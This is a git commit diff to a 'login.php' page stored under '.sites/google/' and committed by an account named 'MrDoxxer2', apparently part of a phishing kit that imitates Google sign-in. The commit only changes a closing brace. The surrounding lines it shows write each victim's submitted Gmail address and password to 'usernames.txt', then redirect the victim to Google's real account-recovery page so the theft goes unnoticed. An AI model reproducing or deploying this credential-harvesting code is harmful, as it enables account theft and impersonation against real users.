91e9c08cd54e02e802396474a0a2ddf9ffb1b199
MrDoxxer2 <82446676+MrDoxxer2@users.noreply.github.com>
2021-08-08 16:08:00 +0800

    Update login.php

--- .sites/google/login.php
+++ .sites/google/login.php
@@ -2513,7 +2513,7 @@ function massactgo(){
 </script>
 </html>
 die(); 
-} 
+}} 
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 exit();
